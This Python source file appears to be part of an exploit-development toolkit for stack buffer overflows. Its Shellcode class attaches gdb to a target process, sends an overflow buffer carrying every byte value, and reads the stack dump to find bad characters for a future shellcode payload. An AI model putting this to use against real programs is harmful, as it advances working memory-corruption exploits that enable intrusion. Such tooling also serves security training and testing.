from Target.target import Target
from Target.target_factory import create_target
import binascii


class Shellcode:
    def __init__(self, target: Target):
        self.target = target
        self.bad_characters = "\x00"
        self.shellcode = ""

    def identify_bad_chars(self, offset: int):
        if not self.target.is_alive():
            self.target = create_target(self.target.process_path)

        gdb_execute = f'/usr/bin/gdb -pid={self.target.get_pid()}'
        debugger = create_target(gdb_execute)
        chars = self.get_hex_chars()

        for i in range(3):
            if i == 1:
                debugger.send_data("\n")
            debugger.receive_data()

        self.target.receive_data()
        debugger.send_data("set style enabled off")
        debugger.receive_data()
        debugger.send_data("continue")
        debugger.receive_data()
        self.target.send_data('A' * offset + "B" * 8 + chars)
        debugger.receive_data()

        debugger.send_data("x/264xb ${register}"
                           .format(register="rsp" if self.target.get_bit_arch() == 64 else "esp"))

        hex_dump = debugger.receive_data() + "\n"
        while True:
            debugger.send_data("\n")
            data = debugger.receive_data()
            hex_dump += data
            if "gdb" in data:
                break

        hex_list = hex_dump.replace("\n", " ").replace("\t", " ").split(" ")
        comparator_list = self.get_hex_comparator_list()
        counter = 0

        for i in range(9, len(hex_list)):
            if len(hex_list[i]) > 4:
                continue
            if hex_list[i] == comparator_list[counter]:
                counter += 1
            else:
                bad_char = comparator_list[counter]
                bad_char_hex = binascii.unhexlify(bad_char[2:]).decode()
                chars = chars.replace(bad_char_hex, "")
                self.bad_characters += bad_char_hex
                break

        print(self.bad_characters.encode())

    def get_hex_chars(self):
        return (
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

    def get_hex_comparator_list(self):
        hex_chars = list()
        for i in range(1, 256):
            if i < 16:
                hex_chars.append(f'0x0{hex(i)[2]}')
            else:
                hex_chars.append(hex(i))
        return hex_chars
